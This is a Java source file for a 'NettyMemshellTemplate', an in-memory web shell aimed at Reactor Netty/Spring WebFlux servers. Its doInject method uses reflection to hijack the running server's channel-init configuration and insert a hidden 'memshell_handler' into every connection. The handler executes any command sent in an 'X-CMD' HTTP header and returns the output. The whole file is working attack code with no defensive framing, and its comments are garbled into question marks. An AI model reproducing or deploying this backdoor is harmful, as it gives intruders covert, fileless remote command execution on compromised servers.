package com.aurora.Templates;

import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.SocketAddress;
import java.util.Scanner;

public class NettyMemshellTemplate extends ChannelDuplexHandler implements ChannelPipelineConfigurer {
    public static Object nettymemshell;
    public  NettyMemshellTemplate(){
        nettymemshell = new NettyMemshellTemplate("");
        doInject();
    }
    public  NettyMemshellTemplate(String a){

    }
    public static String doInject(){
        String msg = "inject-start";
        try {
            Method getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);

            for (int i = 0; i < Array.getLength(threads); i++) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    Field _val$disposableServer = thread.getClass().getDeclaredField("val$disposableServer");
                    _val$disposableServer.setAccessible(true);
                    Object val$disposableServer = _val$disposableServer.get(thread);
                    Field _config = val$disposableServer.getClass().getSuperclass().getDeclaredField("config");
                    _config.setAccessible(true);
                    Object config = _config.get(val$disposableServer);
                    Field _doOnChannelInit = config.getClass().getSuperclass().getSuperclass().getDeclaredField("doOnChannelInit");
                    _doOnChannelInit.setAccessible(true);
                    _doOnChannelInit.set(config, nettymemshell);
                    msg = "inject-success";
                    return "msg";
                }
            }
        }catch (Exception e){
            msg = "inject-error";
        }
        return msg;
    }

    @Override
    // Step1. ????????????ChannelPipelineConfigurer???pipline??????Handler
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {
        ChannelPipeline pipeline = channel.pipeline();
        // ???????????????handler?????????spring???handler?????????
        pipeline.addBefore("reactor.left.httpTrafficHandler","memshell_handler",new NettyMemshellTemplate());
    }


    @Override
    // Step2. ??????Handler???????????????????????????????????????????????????
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if(msg instanceof HttpRequest){
            HttpRequest httpRequest = (HttpRequest)msg;
            try {
                if(httpRequest.headers().contains("X-CMD")) {
                    String cmd = httpRequest.headers().get("X-CMD");
                    String execResult = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                    // ??????????????????
                    send(ctx, execResult, HttpResponseStatus.OK);
                    return;
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        ctx.fireChannelRead(msg);
    }


    private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }

    public static void main(String[] args) {

    }
}